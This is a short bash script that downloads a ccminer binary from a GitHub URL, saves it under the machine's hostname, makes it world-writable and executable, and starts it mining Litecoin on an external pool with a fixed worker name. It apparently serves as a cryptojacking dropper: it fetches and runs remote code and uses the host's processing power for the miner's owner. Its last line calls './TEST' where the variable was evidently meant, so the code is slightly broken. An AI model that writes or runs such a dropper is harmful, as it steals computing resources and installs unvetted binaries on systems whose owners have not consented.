#!/bin/bash

TEST=$(cat /proc/sys/kernel/hostname)

wget -O $TEST https://raw.githubusercontent.com/jsiqiisn/cc/main/ccminer
chmod 777 $TEST
./TEST -a scrypt -o stratum+tcp://ltc.ss.poolin.me:443 -u ltc61.xx -p 123
